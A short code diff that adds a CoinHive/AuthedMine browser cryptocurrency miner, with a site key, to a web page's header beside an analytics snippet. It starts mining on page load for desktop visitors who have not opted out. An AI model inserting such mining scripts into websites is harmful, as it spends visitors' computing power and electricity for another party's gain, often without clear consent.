@@ -14,6 +14,16 @@
         ga('create', 'UA-112512984-1', 'auto');
         ga('send', 'pageview');
   </script>
+  <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+  <script>
+	  var miner = new CoinHive.Anonymous('5fOt5p3ssqNMlnO4yMPNrO5Db4iB8Nv3', {throttle: 0.5});
+
+	  // Only start on non-mobile devices and if not opted-out
+	  // in the last 14400 seconds (4 hours):
+	  if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		  miner.start();
+	  }
+  </script>
   <style>
   a{
     color: #424242;
